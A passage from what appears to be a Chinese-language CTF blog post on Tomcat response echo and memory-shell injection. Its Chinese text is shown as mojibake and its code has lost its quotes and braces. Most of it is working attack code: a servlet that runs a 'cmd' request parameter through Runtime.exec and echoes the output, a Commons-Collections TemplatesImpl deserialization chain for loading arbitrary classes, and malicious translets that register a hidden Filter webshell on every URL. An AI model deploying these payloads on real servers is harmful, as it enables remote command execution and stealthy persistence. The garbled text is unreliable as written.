HttpServlet (javax.servlet.http)internalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)doFilter:162, ApplicationFilterChain (org.apache.catalina.core)...service:357, CoyoteAdapter (org.apache.catalina.connector)service:382, Http11Processor (org.apache.coyote.http11)process:65, AbstractProcessorLight (org.apache.coyote)process:895, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1722, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:49, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:745, Thread (java.lang) è°ƒç”¨äº†Http11Processor#serviceæ–¹æ³• è€ŒHttp11Processorç»§æ‰¿äº†AbstractProcessorç±»ï¼Œè¿™é‡Œçš„responseå¯¹è±¡æ­£æ˜¯AbstractProcessorç±»ä¸­çš„å±æ€§ï¼Œå› æ­¤æˆ‘ä»¬å¦‚æœèƒ½è·å–åˆ°Http11Processorç±»ï¼Œå°±èƒ½è·å–åˆ°responseå¯¹è±¡ é‚£ä¹ˆä¸‹é¢æˆ‘ä»¬å°±æ‰¾ä¸€æ‰¾é‚£é‡Œèƒ½å¤Ÿè·å–åˆ°processorã€‚åœ¨AbstractProtocolçš„å†…éƒ¨ç±»ConnectionHandler#registeræ–¹æ³•ä¸­ï¼Œå°†processorçš„ä¿¡æ¯å­˜å‚¨åœ¨äº†å±æ€§globalä¸­ protected void register(Processor processor) if (this.getProtocol().getDomain() != null) synchronized(this) try ... RequestInfo rp = processor.getRequest().getRequestProcessor(); rp.setGlobalProcessor(this.global); ... è¯¥å±æ€§ä¸­å­˜å‚¨äº†ä¸€ä¸ªRequestInfoçš„Listï¼Œå…¶ä¸­åœ¨RequestInfoä¸­æˆ‘ä»¬ä¹Ÿèƒ½è·å–Request æˆ‘ä»¬æ¥ç€å¾€ä¸‹çœ‹ï¼Œè°ƒç”¨æ ˆè°ƒç”¨äº†å†…éƒ¨ç±»ConnectoinHandlerçš„process()æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šè°ƒç”¨registeræ–¹æ³•å°†processorå­˜å‚¨åœ¨globalä¸­ è‡³æ­¤æˆ‘ä»¬çš„è°ƒç”¨é“¾å¦‚ä¸‹ AbstractProtocol$ConnectoinHandler#process()-------this.global--------RequestInfo-------Request--------Response ç°åœ¨æˆ‘ä»¬çš„å·¥ä½œå°±æ˜¯è·å–AbstractProtocolç±»æˆ–è€…ç»§æ‰¿AbstractProtocolçš„ç±»ï¼Œä»æœ€å¼€å§‹çš„Http11Processor#serviceæ–¹æ³•ä¸­çŸ¥é“è¿˜å¿…é¡»å®ç°Adapteræ¥å£ï¼Œç»§ç»­çœ‹è°ƒç”¨é“¾ã€‚åœ¨CoyoteAdapterç±»ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªconnectorå±æ€§ çœ‹Connectorç±»çš„å®šä¹‰ï¼Œå­˜åœ¨å’ŒAbstractProtocolç›¸å…³çš„protocolHandlerå±æ€§ çœ‹è°ƒç”¨é“¾ï¼Œè¯¥å±æ€§çš„å€¼ä¸ºä¸€ä¸ªHttp11NioProtocolå¯¹è±¡ï¼Œå¹¶ä¸”è¯¥ç±»ç»§æ‰¿äº†AbstractProtocolç±» æ­¤æ—¶æˆ‘ä»¬çš„è°ƒç”¨é“¾å˜æˆå¦‚ä¸‹ Connector-----Http11NioProtocol-----AbstractProtocol$ConnectoinHandler#process()-------this.global--------RequestInfo-------Request--------Response ä¸‹é¢å°±æ˜¯è·å–Connectoräº†ï¼ŒTomcatåœ¨å¯åŠ¨æ—¶ä¼šé€šè¿‡StandardServiceåˆ›å»ºConnector StandardService#addConnectorå¦‚ä¸‹ï¼Œè¯¥æ–¹æ³•ä¼šå°†Connectoræ”¾å…¥å±æ€§connectorsä¸­ public void addConnector(Connector connector) Lock writeLock = connectorsLock.writeLock(); writeLock.lock(); try connector.setService(this); Connector results[] = new Connector[connectors.length + 1]; System.arraycopy(connectors, 0, results, 0, connectors.length); results[connectors.length] = connector; connectors = results; finally writeLock.unlock(); try if (getState().isAvailable()) connector.start(); catch (LifecycleException e) throw new IllegalArgumentException(sm.getString(standardService.connector.startFailed, connector), e); // Report this property change to interested listeners support.firePropertyChange(connector, null, connector); æœ€ç»ˆæˆ‘ä»¬çš„è°ƒç”¨é“¾å¦‚ä¸‹ StandardService-----Connector-----Http11NioProtocol-----AbstractProtocol$ConnectoinHandler#process()-------this.global--------RequestInfo-------Request--------Response ä¸‹é¢çš„å·¥ä½œå°±æ˜¯è·å–StandardServiceå¯¹è±¡äº†ï¼Œåœ¨æ­¤ä¹‹å‰æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹Tomcatçš„ç±»åŠ è½½æœºåˆ¶ Tomcatçš„ç±»åŠ è½½æœºåˆ¶ä¼—æ‰€å‘¨çŸ¥ï¼ŒTomcatä½¿ç”¨çš„å¹¶ä¸æ˜¯ä¼ ç»Ÿçš„ç±»åŠ è½½æœºåˆ¶ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹é¢çš„ä¾‹å­ æˆ‘ä»¬çŸ¥é“ï¼ŒTomcatä¸­çš„ä¸€ä¸ªä¸ªWebappå°±æ˜¯ä¸€ä¸ªä¸ªWebåº”ç”¨ï¼Œå¦‚æœWebAPP Aä¾èµ–äº†common-collection 3.1ï¼Œè€ŒWebApp Bä¾èµ–äº†common-collection 3.2ã€‚è¿™æ ·åœ¨åŠ è½½çš„æ—¶å€™ç”±äºå…¨é™å®šåç›¸åŒï¼Œå› æ­¤ä¸èƒ½åŒæ—¶åŠ è½½ï¼Œæ‰€ä»¥å¿…é¡»å¯¹å„ä¸ªWebappè¿›è¡Œéš”ç¦»ï¼Œå¦‚æœä½¿ç”¨åŒäº²å§”æ´¾æœºåˆ¶ï¼Œé‚£ä¹ˆåœ¨åŠ è½½ä¸€ä¸ªç±»çš„æ—¶å€™ä¼šå…ˆå»ä»–çš„çˆ¶åŠ è½½å™¨åŠ è½½ï¼Œè¿™æ ·å°±æ— æ³•å®ç°éš”ç¦»ã€‚ Tomcatéš”ç¦»çš„å®ç°æ–¹å¼æ˜¯æ¯ä¸ªWebAppç”¨ä¸€ä¸ªç‹¬æœ‰çš„ClassLoaderå®ä¾‹æ¥ä¼˜å…ˆå¤„ç†åŠ è½½ï¼Œå¹¶ä¸ä¼šä¼ é€’ç»™çˆ¶åŠ è½½å™¨ã€‚è¿™ä¸ªå®šåˆ¶çš„ClassLoaderå°±æ˜¯WebappClassLoaderã€‚ é‚£ä¹ˆæˆ‘ä»¬åˆå¦‚ä½•å°†åŸæœ‰çš„çˆ¶åŠ è½½å™¨å’ŒWebappClassLoaderè”ç³»èµ·æ¥å‘¢ï¼Ÿè¿™é‡ŒTomcatä½¿ç”¨çš„æœºåˆ¶æ˜¯çº¿ç¨‹ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨Thread ContextClassLoaderã€‚ Threadç±»ä¸­æœ‰getContextClassLoader()å’ŒsetContextClassLoader(ClassLoader cl)æ–¹æ³•ç”¨æ¥è·å–å’Œè®¾ç½®ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ã€‚å¦‚æœæ²¡æœ‰é€šè¿‡setContextClassLoader(ClassLoader cl)æ–¹æ³•è®¾ç½®ç±»åŠ è½½å™¨ï¼Œé‚£ä¹ˆçº¿ç¨‹å°†ç»§æ‰¿çˆ¶çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ï¼Œå¦‚æœåœ¨åº”ç”¨ç¨‹åºçš„å…¨å±€èŒƒå›´å†…éƒ½æ²¡æœ‰è®¾ç½®çš„è¯ï¼Œé‚£ä¹ˆè¿™ä¸ªä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨é»˜è®¤å°±æ˜¯åº”ç”¨ç¨‹åºç±»åŠ è½½å™¨ã€‚å¯¹äºTomcatæ¥è¯´ContextClassLoaderè¢«è®¾ç½®ä¸ºWebAppClassLoaderï¼ˆåœ¨ä¸€äº›æ¡†æ¶ä¸­å¯èƒ½æ˜¯ç»§æ‰¿äº†public abstract WebappClassLoaderBaseçš„å…¶ä»–Loader)ã€‚ å› æ­¤WebappClassLoaderBaseå°±æ˜¯æˆ‘ä»¬å¯»æ‰¾çš„Threadå’ŒTomcat è¿è¡Œä¸Šä¸‹æ–‡çš„è”ç³»ä¹‹ä¸€ã€‚ è¿™é‡Œé€šè¿‡è°ƒè¯•ï¼Œæˆ‘ä»¬èƒ½å¤Ÿçœ‹åˆ°è¿™é‡Œçš„çº¿ç¨‹ç±»åŠ è½½å™¨æ˜¯ç»§æ‰¿äº†WebAppClassLoaderçš„ParallelWebAppClassLoaderã€‚ å…¶ä¸­æˆ‘ä»¬åŒæ ·èƒ½è·å–åˆ°StandardService æ„é€ PayloadæŒ‰ç…§ä¸Šæ–‡å¯¹è°ƒç”¨æ ˆåˆ†æçš„æ€è·¯ï¼Œæˆ‘ä»¬å¯ä»¥ä¾æ¬¡æ„é€ å‡ºå¦‚ä¸‹Payload è·å–StandardContextorg.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext(); è·å–ApplicationContextStandardContextä¸­æ²¡æœ‰ç›´æ¥çš„æ–¹æ³•è·å–contextï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é€šè¿‡åå°„è·å– Field context = Class.forName(org.apache.catalina.core.StandardContext).getDeclaredField(context);context.setAccessible(true);org.apache.catalina.core.ApplicationContext ApplicationContext = (org.apache.catalina.core.ApplicationContext)context.get(standardContext); è·å–StandardServiceåŒæ ·ä½¿ç”¨åå°„è·å– //è·å–StandardServiceField standardServiceField = Class.forName(org.apache.catalina.core.StandardService).getDeclaredField(service);standardServiceField.setAccessible(true);StandardService standardService = (StandardService) standardServiceField.get(applicationContext); è·å–Connector//è·å–ConnectorField connectorsField = Class.forName(org.apache.catalina.connector.Connector).getDeclaredField(connectors);connectorsField.setAccessible(true);Connector[] connectors = (Connector[]) connectorsField.get(standardService);Connector connector = connectors[0]; è·å–Handleræˆ‘ä»¬å¯ä»¥é€šè¿‡Connector#getProtocolHandleræ–¹æ³•æ¥è·å–å¯¹åº”çš„protocolHandler è¿™é‡Œè·å–çš„protocolHandleræ˜¯Http11NioProtocolå¯¹è±¡ï¼Œå‰é¢æˆ‘ä»¬åˆ†æè¿‡äº†è¯¥ç±»ç»§æ‰¿äº†AbstractProtocolç±»ï¼Œä¸‹é¢æˆ‘ä»¬å†é€šè¿‡åå°„è·å–Handlerâ€”â€”å†…éƒ¨ç±»ConnectionHandler //è·å–HandlerProtocolHandler protocolHandler = connector.getProtocolHandler();Field handlerField = Class.forName(org.apache.coyote.AbstractProtocol).getDeclaredField(handler);handlerField.setAccessible(true);org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler); è·å–å†…éƒ¨ç±»ConnectionHandlerçš„globalå±æ€§//è·å–å†…éƒ¨ç±»AbstractProtocol$ConnectionHandlerçš„globalå±æ€§Field globalHandler = Class.forName(org.apache.coyote.AbstractProtocol$ConnectionHandler).getDeclaredField(global);globalHandler.setAccessible(true);RequestGroupInfo global = (RequestGroupInfo) globalHandler.get(handler); è·å–processorsglobalå±æ€§RequestGroupInfoç±»ä¸­çš„processorsæ•°ç»„ç”¨æ¥å­˜å‚¨RequestInfoå¯¹è±¡ï¼Œä¸‹é¢æˆ‘ä»¬æ¥è·å–RequestInfoå¯¹è±¡ï¼Œè¿›è€Œè·å–requestå¯¹è±¡ //è·å–processorsField processorsField = Class.forName(org.apache.coyote.RequestGroupInfo).getDeclaredField(processors);processorsField.setAccessible(true);ListRequestInfo requestInfoList = (ListRequestInfo) processorsField.get(global); æœ€åæˆ‘ä»¬è·å–requestå’Œresponseå¯¹è±¡ è·å–requestå’Œresponseè¿™é‡Œæˆ‘é€‰æ‹©è¿›ä¸€æ­¥è·å–org.apache.catalina.connector.Requestå¯¹è±¡ï¼Œå› ä¸ºå®ƒç»§æ‰¿è‡ªHttpServletRequestï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡PrintWriterç±»ç›´æ¥è·å–å›æ˜¾ //è·å–requestå’ŒresponseField requestField = Class.forName(org.apache.coyote.RequestInfo).getDeclaredField(req);requestField.setAccessible(true);for (RequestInfo requestInfo : requestInfoList) //è·å–org.apache.coyote.Request org.apache.coyote.Request request = (org.apache.coyote.Request) requestField.get(requestInfo); //é€šè¿‡org.apache.coyote.Requestçš„Noteså±æ€§è·å–ç»§æ‰¿HttpServletRequestçš„org.apache.catalina.connector.Request org.apache.catalina.connector.Request http_request = (org.apache.catalina.connector.Request) request.getNote(1); org.apache.catalina.connector.Response http_response = http_request.getResponse(); PrintWriter writer = http_response.getWriter(); String cmd = http_request.getParameter(cmd); InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream(); Scanner scanner = new Scanner(inputStream).useDelimiter(\\\\A); String result = scanner.hasNext()?scanner.next():; scanner.close(); writer.write(result); writer.flush(); writer.close(); å®Œæ•´pocimport org.apache.catalina.connector.Connector;import org.apache.catalina.core.ApplicationContext;import org.apache.catalina.core.StandardContext;import org.apache.catalina.core.StandardService;import org.apache.coyote.ProtocolHandler;import org.apache.coyote.RequestGroupInfo;import org.apache.coyote.RequestInfo;import org.apache.tomcat.util.net.AbstractEndpoint; import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.InputStream;import java.io.PrintWriter;import java.lang.reflect.Field;import java.util.List;import java.util.Scanner; @WebServlet(/response)public class Tomcat_Echo_Response extends HttpServlet @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException //è·å–StandardService org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext(); System.out.println(standardContext); try //è·å–ApplicationContext Field applicationContextField = Class.forName(org.apache.catalina.core.StandardContext).getDeclaredField(context); applicationContextField.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(standardContext); //è·å–StandardService Field standardServiceField = Class.forName(org.apache.catalina.core.ApplicationContext).getDeclaredField(service); standardServiceField.setAccessible(true); StandardService standardService = (StandardService) standardServiceField.get(applicationContext); //è·å–Connector Field connectorsField = Class.forName(org.apache.catalina.core.StandardService).getDeclaredField(connectors); connectorsField.setAccessible(true); Connector[] connectors = (Connector[]) connectorsField.get(standardService); Connector connector = connectors[0]; //è·å–Handler ProtocolHandler protocolHandler = connector.getProtocolHandler(); Field handlerField = Class.forName(org.apache.coyote.AbstractProtocol).getDeclaredField(handler); handlerField.setAccessible(true); org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler); //è·å–å†…éƒ¨ç±»AbstractProtocol$ConnectionHandlerçš„globalå±æ€§ Field globalHandler = Class.forName(org.apache.coyote.AbstractProtocol$ConnectionHandler).getDeclaredField(global); globalHandler.setAccessible(true); RequestGroupInfo global = (RequestGroupInfo) globalHandler.get(handler); //è·å–processors Field processorsField = Class.forName(org.apache.coyote.RequestGroupInfo).getDeclaredField(processors); processorsField.setAccessible(true); ListRequestInfo requestInfoList = (ListRequestInfo) processorsField.get(global); //è·å–requestå’Œresponse Field requestField = Class.forName(org.apache.coyote.RequestInfo).getDeclaredField(req); requestField.setAccessible(true); for (RequestInfo requestInfo : requestInfoList) //è·å–org.apache.coyote.Request org.apache.coyote.Request request = (org.apache.coyote.Request) requestField.get(requestInfo); //é€šè¿‡org.apache.coyote.Requestçš„Noteså±æ€§è·å–ç»§æ‰¿HttpServletRequestçš„org.apache.catalina.connector.Request org.apache.catalina.connector.Request http_request = (org.apache.catalina.connector.Request) request.getNote(1); org.apache.catalina.connector.Response http_response = http_request.getResponse(); PrintWriter writer = http_response.getWriter(); String cmd = http_request.getParameter(cmd); InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream(); Scanner scanner = new Scanner(inputStream).useDelimiter(\\\\A); String result = scanner.hasNext()?scanner.next():; scanner.close(); writer.write(result); writer.flush(); writer.close(); catch (NoSuchFieldException e) e.printStackTrace(); catch (ClassNotFoundException e) e.printStackTrace(); catch (IllegalAccessException e) e.printStackTrace(); ååºåˆ—åŒ–æ³¨å…¥å†…å­˜é©¬åœ¨CTFä¸­ï¼Œæˆ‘ä»¬æ³¨å…¥å†…å­˜é©¬çš„ç›®çš„å¾€å¾€æ˜¯ä¸ºäº†è·å–ä¸å‡ºç½‘æœºå™¨çš„å›æ˜¾ï¼Œè€Œå†…å­˜é©¬çš„æ³¨å…¥å¾€å¾€æ˜¯é€šè¿‡ååºåˆ—åŒ–æ¼æ´ï¼Œä¸‹é¢å°±æ˜¯ä¸€ä¸ªä¾‹å­ ç¯å¢ƒæ­å»ºä¸‹é¢æˆ‘ä»¬å…ˆæ¥æ­å»ºä¸€ä¸ªå­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„ç¯å¢ƒï¼Œç¼–å†™ä¸€ä¸ªå­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„Servletã€‚è¿™é‡ŒJDKç‰ˆæœ¬ä¸ºjdk8u_65 import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.ByteArrayInputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.util.Base64; @WebServlet(/unserial)public class Unserial_Servlet extends HttpServlet @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException byte[] data = Base64.getDecoder().decode(req.getParameter(data)); ByteArrayInputStream inputStream = new ByteArrayInputStream(data); ObjectInputStream objectInputStream = new ObjectInputStream(inputStream); try System.out.println(objectInputStream.readObject()); catch (ClassNotFoundException e) e.printStackTrace(); @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException doPost(req,resp); ä¾èµ– dependencies dependency groupIdjunit/groupId artifactIdjunit/artifactId version4.11/version scopetest/scope /dependency dependency groupIdcommons-collections/groupId artifactIdcommons-collections/artifactId version3.2.1/version /dependency dependency groupIdjavax.servlet/groupId artifactIdjavax.servlet-api/artifactId version4.0.1/version scopecompile/scope /dependency dependency groupIdjavax.servlet.jsp/groupId artifactIdjsp-api/artifactId version2.1/version scopeprovided/scope /dependency dependency groupIdorg.apache.tomcat/groupId artifactIdtomcat-catalina/artifactId version9.0.91/version /dependency dependency groupIdorg.apache.tomcat.embed/groupId artifactIdtomcat-embed-el/artifactId version9.0.91/version /dependency/dependencies å»å¾€unserialè·¯ç”±æŠ¥500æ˜¯æ­£å¸¸çš„ æˆ‘ä»¬çœ‹ä¸Šé¢çš„Servletä»£ç å¯çŸ¥å°±æ˜¯ä¸€ä¸ªæ­£å¸¸çš„ccååºåˆ—åŒ–æ¼æ´ï¼Œæ‰€ä»¥è¿™ç§è§£æ³•è¿™é‡Œå°±ä¸å±•ç¤ºäº† é‚£ä¹ˆå½“ä¸å‡ºç½‘çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±éœ€è¦æ³¨å…¥å†…å­˜é©¬äº† ä»»æ„ç±»åŠ è½½é¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€ä¸ªä»»æ„ç±»åŠ è½½çš„poc package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import javax.xml.transform.Templates;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class Cc3 public static void main(String[] args) throws Exception TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(_name); nameField.setAccessible(true); nameField.set(templates, aaa); Field bytecodesField = tc.getDeclaredField(_bytecodes); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); byte[][] codes = code; bytecodesField.set(templates, codes); Field tfactoryField = tc.getDeclaredField(_tfactory); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]Templates.class,new Object[]templates); Transformer[] transformers = new Transformer[] new ConstantTransformer(TrAXFilter.class), instantiateTransformer ; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);// instantiateTransformer.transform(TrAXFilter.class); //å®ƒçš„classç±»å‹å¯ä»¥åºåˆ—åŒ–ï¼Œè¯¥è¡Œä»£ç è¿è¡Œå¯ä»¥å¼¹å‡ºè®¡ç®—å™¨ HashMapObject, Object map = new HashMap(); map.put(value, b); MapObject, Object transformedMap = TransformedMap.decorate(map, null, chainedTransformer); Class c = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler); Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object o = ctor.newInstance(Target.class, transformedMap);// serialize(o); unserialize(ser.bin); public static void serialize(Object obj) throws IOException ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(ser.bin)); oos.writeObject(obj); public static Object unserialize(String Filename) throws IOException, ClassNotFoundException ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; æ³¨å…¥å†…å­˜é©¬åœ¨å‰æ–‡Tomcatå†…å­˜é©¬éƒ¨åˆ†ï¼Œæˆ‘ä»¬æ˜¯é€šè¿‡æ‰§è¡ŒJSPæ–‡ä»¶æ¥å†™å…¥å†…å­˜é©¬çš„ã€‚ä½†æ˜¯ç”±äºJSPå†…ç½®äº†ä¸€äº›requestå¯¹è±¡ï¼Œå› æ­¤æˆ‘ä»¬å¾ˆå®¹æ˜“è·å–å½“å‰çº¿ç¨‹çš„å›æ˜¾ã€‚å¦‚æœæˆ‘ä»¬é€šè¿‡ååºåˆ—åŒ–æ¼æ´æ³¨å…¥å†…å­˜é©¬çš„è¯ï¼Œå°±éœ€è¦å‚è€ƒä¸Šæ–‡æåˆ°çš„å›æ˜¾æ–¹å¼æ‰‹åŠ¨è·å–requestå¯¹è±¡äº†ã€‚ è¿™é‡Œæˆ‘ä»¬æ„é€ çš„ååºåˆ—åŒ–æ¼æ´å¯ä»¥è¿›è¡Œä»»æ„ç±»åŠ è½½ï¼Œå› æ­¤æˆ‘ä»¬æ„é€ ä¸€ä¸ªæ¶æ„ç±»æ¥æ³¨å…¥å†…å­˜é©¬ï¼Œè¿™é‡Œæˆ‘ä»¬ä»¥Filterå‹å†…å­˜é©¬ä¸ºä¾‹ã€‚ è·å–Requestå¯¹è±¡æˆ‘ä»¬é¦–å…ˆé€šè¿‡ä¸Šæ–‡çš„å›æ˜¾æŠ€æœ¯æ¥è·å–å½“å‰çº¿ç¨‹çš„requestå¯¹è±¡ï¼Œè¿™é‡Œæˆ‘ä»¥ThreadLocalæ–¹å¼ä¸ºä¾‹ï¼Œæ„é€ å¦‚ä¸‹ package Tomcat_Echo_memShell; import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.apache.catalina.core.ApplicationFilterChain; import javax.servlet.ServletResponse;import java.io.PrintWriter;import java.lang.reflect.Field;import java.lang.reflect.Modifier; public class Tomcat_Echo_inject_ThreadLocal extends AbstractTranslet static try //åå°„è·å–æ‰€éœ€å±æ€§ java.lang.reflect.Field WRAP_SAME_OBJECT_FIELD = Class.forName(org.apache.catalina.core.ApplicationDispatcher).getDeclaredField(WRAP_SAME_OBJECT); java.lang.reflect.Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(lastServicedRequest); java.lang.reflect.Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(lastServicedResponse); //ä½¿ç”¨modifiersFieldåå°„ä¿®æ”¹finalå‹å˜é‡ java.lang.reflect.Field modifiersField = Field.class.getDeclaredField(modifiers); modifiersField.setAccessible(true); modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() ~Modifier.FINAL); modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() ~Modifier.FINAL); modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() ~Modifier.FINAL); WRAP_SAME_OBJECT_FIELD.setAccessible(true); lastServicedRequestField.setAccessible(true); lastServicedResponseField.setAccessible(true); //å°†å˜é‡WRAP_SAME_OBJECT_FIELDè®¾ç½®ä¸ºtrueï¼Œå¹¶åˆå§‹åŒ–lastServicedRequestå’ŒlastServicedResponseå˜é‡ if (!WRAP_SAME_OBJECT_FIELD.getBoolean(null)) WRAP_SAME_OBJECT_FIELD.setBoolean(null, true); if (lastServicedRequestField.get(null) == null) lastServicedRequestField.set(null, new ThreadLocal()); if (lastServicedResponseField.get(null) == null) lastServicedResponseField.set(null, new ThreadLocal()); //è·å–responseå˜é‡ if (lastServicedResponseField.get(null) != null) ThreadLocal threadLocal = (ThreadLocal) lastServicedResponseField.get(null); ServletResponse servletResponse = (ServletResponse) threadLocal.get(); PrintWriter writer = servletResponse.getWriter(); writer.write(Inject ThreadLocal Successfully!); writer.flush(); writer.close(); catch (Exception e) e.printStackTrace(); @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException æˆ‘ä»¬å°†è¿™ä¸ªæ¶æ„ç±»å‘é€è¿‡å»ä¹‹åï¼Œä¼šåˆå§‹åŒ–lastServicedRequestå’ŒlastServicedResponseå±æ€§ä¸ºThreadLocalç±»ï¼Œä¸‹é¢æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¯¥ç±»è·å–requestå¯¹è±¡äº† æ³¨å…¥Filterå†…å­˜é©¬ä¸‹é¢æˆ‘ä»¬ä¾é ä¸Šæ–‡è·å–åˆ°çš„requestå¯¹è±¡è¿›è¡Œåç»­æ³¨å…¥å·¥ä½œ package Tomcat_Echo_memShell; import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.apache.catalina.core.ApplicationContext;import org.apache.catalina.core.ApplicationFilterChain;import org.apache.catalina.core.ApplicationFilterConfig;import org.apache.catalina.core.StandardContext;import org.apache.tomcat.util.descriptor.web.FilterDef;import org.apache.tomcat.util.descriptor.web.FilterMap; import javax.servlet.*;import java.io.IOException;import java.io.InputStream;import java.io.PrintWriter;import java.lang.reflect.InvocationTargetException; public class Tomcat_Echo_inject_Filter extends AbstractTranslet implements Filter static try ServletContext servletContext = getServletContext(); java.lang.reflect.Field appContextField = servletContext.getClass().getDeclaredField(context); appContextField.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext); java.lang.reflect.Field standardContextField = applicationContext.getClass().getDeclaredField(context); standardContextField.setAccessible(true); StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext); Tomcat_Echo_inject_Filter filter = new Tomcat_Echo_inject_Filter(); String name = ShellFilter; FilterDef filterDef = new FilterDef(); filterDef.setFilter(filter); filterDef.setFilterName(name); filterDef.setFilterClass(filter.getClass().getName()); standardContext.addFilterDef(filterDef); FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(/*); filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(filterMap); java.lang.reflect.Field Configs = standardContext.getClass().getDeclaredField(filterConfigs); Configs.setAccessible(true); java.util.Map filterConfigs = (java.util.Map) Configs.get(standardContext); java.lang.reflect.Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef); filterConfigs.put(name, filterConfig); catch (NoSuchFieldException e) e.printStackTrace(); catch (ClassNotFoundException e) e.printStackTrace(); catch (IllegalAccessException e) e.printStackTrace(); catch (InvocationTargetException e) e.printStackTrace(); catch (NoSuchMethodException e) e.printStackTrace(); catch (InstantiationException e) e.printStackTrace(); public static ServletContext getServletContext() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException java.lang.reflect.Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(lastServicedRequest); lastServicedRequestField.setAccessible(true); ThreadLocal threadLocal = (ThreadLocal) lastServicedRequestField.get(null); if(threadLocal!=null threadLocal.get()!=null) ServletRequest servletRequest = (ServletRequest) threadLocal.get(); return 